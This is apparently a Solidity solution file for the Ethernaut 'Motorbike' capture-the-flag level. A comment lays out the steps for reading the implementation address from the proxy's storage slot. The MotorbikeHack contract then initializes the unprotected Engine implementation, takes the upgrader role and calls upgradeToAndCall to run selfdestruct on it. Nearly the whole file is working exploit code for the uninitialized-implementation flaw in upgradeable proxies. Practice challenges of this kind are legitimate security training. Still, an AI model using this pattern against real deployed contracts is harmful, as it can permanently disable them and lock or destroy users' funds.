/**
 * How to beat this level:
 * 1) Deploy MotorbikeHack
 * 2) In the Ethernaut website console, run `await web3.eth.getStorageAt(contract.address,
 * "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")`
 * 3) Remove all zeros right to 0x from the result from 2) to get the instance contract address
 * 4) Call attack() at the address from 3)
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEngine {
    function upgrader() external view returns (address);
    function initialize() external;
    function upgradeToAndCall(address, bytes memory) external payable;
}

contract MotorbikeHack {
    function attack(address _target) external {
        IEngine target = IEngine(_target);
        target.initialize();
        target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}
